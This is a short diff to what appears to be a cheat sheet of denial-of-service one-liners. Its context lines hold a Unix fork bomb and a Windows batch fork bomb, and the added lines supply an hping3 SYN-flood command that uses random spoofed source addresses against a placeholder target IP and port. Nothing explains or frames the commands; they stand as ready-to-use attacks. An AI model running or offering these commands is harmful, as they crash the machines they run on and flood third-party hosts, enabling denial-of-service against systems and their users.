@@ -2,3 +2,6 @@
   :(){ :|:& };:
 # Windows Fork Bomb
   echo "%0|%0" > file.bat (start file.bat)
+  
+# TCP Flood
+  hping3 -c 10000 -d 120 -S -w 64 --flood --rand-source  -p <port> <targetIP>
